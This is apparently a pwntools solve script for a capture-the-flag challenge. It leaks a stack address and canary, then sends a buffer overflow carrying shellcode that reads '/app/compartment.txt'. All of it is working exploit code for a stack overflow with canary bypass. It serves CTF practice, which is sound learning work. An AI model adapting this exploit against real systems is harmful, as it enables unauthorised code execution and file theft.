from pwn import *

with remote("localhost", 25039) as io: # Change accordingly
    io.recvuntil(b"I have a compartment available for renting at ")
    addr = int(io.recvuntil(b",", drop=True), 16)
    io.recvuntil(b"just HKD ")
    canary = int(io.recvuntil(b" ", drop=True),16)

    context.arch = 'amd64'
    shellcode = shellcraft.openat(0, '/app/compartment.txt', 0)
    shellcode += shellcraft.read(3,addr+0x100,0x200)
    shellcode += shellcraft.write(1,addr+0x100,0x200)
    shellcode = asm(shellcode)

    payload = flat(
        shellcode,
        b"A" * (0x88 - len(shellcode)),
        canary,
        b"\x00" * 8,
        addr
    )
    io.sendline(payload)
    io.interactive()